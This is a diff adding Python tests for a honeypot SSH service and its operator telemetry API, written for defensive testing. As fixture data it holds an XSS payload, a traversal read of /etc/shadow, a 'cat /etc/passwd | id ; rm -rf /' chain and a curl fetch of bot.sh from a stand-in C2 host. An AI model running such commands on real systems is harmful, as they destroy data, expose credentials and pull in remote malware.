@@ -912,6 +912,245 @@ class TestWebDecoyAndHarness(unittest.TestCase):
         res_404 = self.client.get("/api/decoy/provenance/nonexistent-session-xyz")
         self.assertEqual(res_404.status_code, 404)
 
+    def test_operator_telemetry_loading_success(self) -> None:
+        """GET /api/decoy/operator/telemetry loads active sessions and correlated gateway decisions."""
+        sid = "op-telemetry-sess-1"
+        decoy.record_decoy_login(sid, "194.26.29.112", "ssh", "admin", "123456", success=False)
+        decoy.execute_decoy_command(sid, "uname -a")
+
+        res = self.client.get(
+            "/api/decoy/operator/telemetry",
+            headers={"X-Operator-Token": "dev-operator-token-2026"},
+        )
+        self.assertEqual(res.status_code, 200)
+        data = res.json()
+        self.assertEqual(data["status"], "ok")
+        self.assertTrue(len(data["sessions"]) >= 1)
+        target_s = next((s for s in data["sessions"] if s["session_id"] == sid), None)
+        self.assertIsNotNone(target_s)
+        self.assertEqual(target_s["source_ip"], "194.26.29.112")
+        self.assertEqual(target_s["service"], "ssh")
+        self.assertIn("gateway_decision", target_s)
+        self.assertIn("gateway_summary", data)
+
+    def test_operator_telemetry_invalid_token_returns_401(self) -> None:
+        """GET /api/decoy/operator/telemetry rejects invalid operator tokens with 401."""
+        res = self.client.get(
+            "/api/decoy/operator/telemetry",
+            headers={"X-Operator-Token": "invalid-token-12345"},
+        )
+        self.assertEqual(res.status_code, 401)
+        self.assertIn("Invalid operator authorization", res.json()["detail"])
+
+    def test_operator_telemetry_malicious_text_storage_and_rendering_safety(self) -> None:
+        """
+        Commands containing malicious injection strings (<script>, | id, ; rm -rf)
+        are stored and served verbatim as plain text strings without causing execution
+        or HTML sanitization corruption.
+        """
+        sid = "op-malicious-text-sess"
+        xss_cmd = "<script>alert('XSS')</script>"
+        traversal_cmd = "cat ../../../../../../etc/shadow"
+        pipe_cmd = "cat /etc/passwd | id ; rm -rf /"
+
+        decoy.execute_decoy_command(sid, xss_cmd)
+        decoy.execute_decoy_command(sid, traversal_cmd)
+        decoy.execute_decoy_command(sid, pipe_cmd)
+
+        res = self.client.get(
+            "/api/decoy/operator/telemetry",
+            headers={"X-Operator-Token": "dev-operator-token-2026"},
+        )
+        self.assertEqual(res.status_code, 200)
+        session_data = next((s for s in res.json()["sessions"] if s["session_id"] == sid), None)
+        self.assertIsNotNone(session_data)
+        # Commands are preserved as literal text
+        self.assertIn(xss_cmd, session_data["commands"])
+        self.assertIn(traversal_cmd, session_data["commands"])
+        self.assertIn(pipe_cmd, session_data["commands"])
+
+    def test_operator_telemetry_updated_sessions(self) -> None:
+        """New commands and evidence uploads dynamically update the operator telemetry payload."""
+        sid = "op-updated-sess"
+        # 1. Spawn session
+        decoy.record_decoy_login(sid, "203.0.113.88", "ssh", "admin", "admin", success=True)
+        # 2. Upload file
+        file_bytes = b"curl http://new-c2.org:9999/bot.sh\n"
+        decoy.submit_file_evidence(sid, "bot.sh", file_bytes)
+
+        res = self.client.get(f"/api/decoy/operator/sessions/{sid}")
+        self.assertEqual(res.status_code, 200)
+        data = res.json()
+        self.assertEqual(data["session_id"], sid)
+        self.assertEqual(len(data["file_submissions"]), 1)
+        self.assertEqual(data["file_submissions"][0]["original_filename"], "bot.sh")
+        self.assertEqual(data["c2_address"], "http://new-c2.org:9999/bot.sh")
+
+
+# =============================================================================
+# End-to-End Integration Test: Real SSH Client + Fake Person C Callback
+# =============================================================================
+
+class TestPersonBIntegrationWithPersonCCallback(unittest.IsolatedAsyncioTestCase):
+    """
+    End-to-end integration test verifying Person B's honeypot integration with Person C:
+    1. Connects using a real SSH client (asyncssh) over a genuine TCP connection.
+    2. Performs simulated commands (uname -a, ls /etc/camera).
+    3. Accesses a honeytoken bait file (cat /etc/camera/credentials.conf) -> triggers canary.
+    4. Submits a harmless indicator sample through the supported HTTP upload mechanism.
+    5. Confirms correct DecoySessionEvent updates arrive at each stage via Person C's callback.
+    6. Confirms the operator API exposes the resulting session with all correlated data.
+    """
+
+    TEST_SSH_PORT = 22225
+    TEST_SSH_HOST = "127.0.0.1"
+
+    async def asyncSetUp(self) -> None:
+        import ssh_decoy
+        decoy.reset_decoy_state()
+        gateway.reset_gateway()
+
+        self.callback_events: List[schema.DecoySessionEvent] = []
+
+        def fake_person_c_callback(event: schema.DecoySessionEvent) -> None:
+            self.callback_events.append(event)
+
+        self.callback = fake_person_c_callback
+        decoy.register_session_listener(self.callback)
+
+        self.ssh_controller = ssh_decoy.DecoySSHServerController(
+            host=self.TEST_SSH_HOST,
+            port=self.TEST_SSH_PORT,
+        )
+        await self.ssh_controller.start()
+        self.client = TestClient(dev_harness.app)
+
+    async def asyncTearDown(self) -> None:
+        decoy.unregister_session_listener(self.callback)
+        await self.ssh_controller.stop()
+
+    async def test_end_to_end_ssh_honeytoken_upload_and_person_c_callback(self) -> None:
+        """
+        Complete end-to-end integration drill:
+        - Real SSH connection & commands
+        - Honeytoken hit detection
+        - Harmless indicator evidence submission
+        - Verification of Person C DecoySessionEvent updates
+        - Verification of Operator API telemetry exposure
+        """
+        import asyncssh
+
+        # Step 1: Connect using real SSH client
+        async with asyncssh.connect(
+            self.TEST_SSH_HOST,
+            port=self.TEST_SSH_PORT,
+            username="root",
+            password="root",
+            known_hosts=None,
+        ) as conn:
+            async with conn.create_process(term_type="xterm") as process:
+                # Read banner
+                banner = await asyncio.wait_for(process.stdout.read(1024), timeout=4.0)
+                self.assertIn("AegisOS", banner)
+
+                # Confirm initial callback event arrived for SSH login
+                self.assertTrue(len(self.callback_events) >= 1)
+                ssh_login_event = next((e for e in self.callback_events if e.service == "ssh"), None)
+                self.assertIsNotNone(ssh_login_event)
+                session_id = ssh_login_event.session_id
+                self.assertEqual(ssh_login_event.failed_logins, 0)
+                self.assertFalse(ssh_login_event.honeytoken_hit)
+
+                # Step 2: Perform simulated commands
+                process.stdin.write("uname -a\n")
+                await process.stdin.drain()
+                uname_out = await asyncio.wait_for(process.stdout.read(1024), timeout=4.0)
+                self.assertIn("aegis-smartcam-01", uname_out)
+
+                process.stdin.write("ls /etc/camera\n")
+                await process.stdin.drain()
+                ls_out = await asyncio.wait_for(process.stdout.read(1024), timeout=4.0)
+                self.assertIn("credentials.conf", ls_out)
+
+                # Step 3: Access a honeytoken
+                process.stdin.write("cat /etc/camera/credentials.conf\n")
+                await process.stdin.drain()
+                trap_out = await asyncio.wait_for(process.stdout.read(2048), timeout=4.0)
+                self.assertIn("NEVER GONNA GIVE YOU UP", trap_out)
+
+                # Confirm Person C callback received honeytoken update
+                events_for_sess = [e for e in self.callback_events if e.session_id == session_id]
+                self.assertTrue(any(e.honeytoken_hit for e in events_for_sess))
+
+                # Step 4: Disconnect cleanly
+                process.stdin.write("exit\n")
+                await process.stdin.drain()
+
+        # Step 5: Submit a harmless indicator sample through the supported mechanism
+        harmless_sample = (
+            b"#!/bin/sh\n"
+            b"# Harmless Test Indicator\n"
+            b"C2=http://harmless-threat-intel.org:8443/collector\n"
+        )
+        expected_sha256 = hashlib.sha256(harmless_sample).hexdigest()
+
+        upload_res = self.client.post(
+            "/api/decoy/upload",
+            json={
+                "session_id": session_id,
+                "filename": "sample_beacon.sh",
+                "content_base64": base64.b64encode(harmless_sample).decode("ascii"),
+            },
+        )
+        self.assertEqual(upload_res.status_code, 200)
+        upload_data = upload_res.json()
+        self.assertEqual(upload_data["status"], "quarantined")
+        self.assertEqual(upload_data["sha256"], expected_sha256)
+        self.assertIn("http://harmless-threat-intel.org:8443/collector", upload_data["candidate_urls"])
+
+        # Step 6: Confirm correct event updates arrived at Person C callback
+        final_events = [e for e in self.callback_events if e.session_id == session_id]
+        self.assertTrue(len(final_events) >= 3, f"Expected multiple updates, got {len(final_events)}")
+        latest_event = final_events[-1]
+
+        self.assertEqual(latest_event.session_id, session_id)
+        self.assertEqual(latest_event.service, "ssh")
+        self.assertTrue(latest_event.honeytoken_hit)
+        self.assertEqual(latest_event.malware_hash, expected_sha256)
+        self.assertEqual(latest_event.c2_address, "http://harmless-threat-intel.org:8443/collector")
+        self.assertTrue(any("uname -a" in c for c in latest_event.commands))
+        self.assertTrue(any("credentials.conf" in c for c in latest_event.commands))
+
+        # Step 7: Confirm the operator API exposes the resulting session
+        # Telemetry list endpoint
+        op_res = self.client.get(
+            "/api/decoy/operator/telemetry",
+            headers={"X-Operator-Token": "dev-operator-token-2026"},
+        )
+        self.assertEqual(op_res.status_code, 200)
+        op_data = op_res.json()
+        op_session = next((s for s in op_data["sessions"] if s["session_id"] == session_id), None)
+        self.assertIsNotNone(op_session)
+        self.assertEqual(op_session["source_ip"], "127.0.0.1")
+        self.assertEqual(op_session["service"], "ssh")
+        self.assertTrue(op_session["honeytoken_hit"])
+        self.assertEqual(op_session["malware_hash"], expected_sha256)
+        self.assertEqual(op_session["c2_address"], "http://harmless-threat-intel.org:8443/collector")
+        self.assertIn("gateway_decision", op_session)
+        self.assertEqual(len(op_session["file_submissions"]), 1)
+
+        # Single session detail endpoint
+        detail_res = self.client.get(
+            f"/api/decoy/operator/sessions/{session_id}",
+            headers={"X-Operator-Token": "dev-operator-token-2026"},
+        )
+        self.assertEqual(detail_res.status_code, 200)
+        detail_data = detail_res.json()
+        self.assertEqual(detail_data["session_id"], session_id)
+        self.assertEqual(detail_data["malware_hash"], expected_sha256)
+        self.assertIn("provenance", detail_data)
+        self.assertEqual(detail_data["provenance"]["file_submissions_count"], 1)
+
 
 if __name__ == "__main__":
     unittest.main()
